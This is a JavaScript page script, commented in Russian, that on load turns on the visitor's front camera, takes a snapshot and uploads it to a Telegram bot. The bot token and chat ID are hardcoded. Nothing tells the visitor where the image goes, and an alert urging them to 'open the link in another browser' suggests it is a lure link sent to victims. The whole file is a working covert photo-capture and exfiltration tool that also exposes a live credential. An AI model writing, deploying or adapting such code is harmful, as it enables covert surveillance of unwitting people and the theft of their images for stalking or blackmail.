document.addEventListener('DOMContentLoaded', async () => {
    const video = document.querySelector('video');
    const canvas = document.querySelector('canvas');
    const telegramBotToken = '7686200174:AAHWdO2XI0Xx90lBpwI3mdtTwYyA6_APHjQ'; // Укажите API-ключ бота
    const chatId = '1713048880'; // Укажите ваш Chat ID

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert('Пожалуйста, откройте ссылку с другого браузера');
        return;
    }

    async function startCamera() {
        try {
            const constraints = {
                 video: {
                    facingMode: 'user', // Используется передняя камера
                },
            };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            video.play();
            video.onloadedmetadata = () => {
                setTimeout(() => takeSnapshot(stream), 1000);
            };
        } catch (error) {
            console.error('Ошибка при доступе к камере:', error);
            alert('Ошибка при доступе к камере: ' + error.message);
        }
    }

    function takeSnapshot(stream) {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png'); // Получаем снимок в формате base64
            sendPhotoToTelegram(imageData);
            stream.getTracks().forEach(track => track.stop()); // Останавливаем камеру
        } else {
            setTimeout(() => takeSnapshot(stream), 100);
        }
    }

    async function sendPhotoToTelegram(image) {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
        const blob = await fetch(image).then(res => res.blob()); // Преобразование Base64 в Blob
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.png'); // Указываем имя файла
    
        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData,
            });
            const result = await response.json();
            if (result.ok) {
                console.log('Фото успешно отправлено в Telegram!');
            } else {
                console.error('Ошибка отправки фото в Telegram:', result.description);
            }
        } catch (error) {
            console.error('Ошибка при отправке фото в Telegram:', error.message);
        }
    }

    startCamera();
});
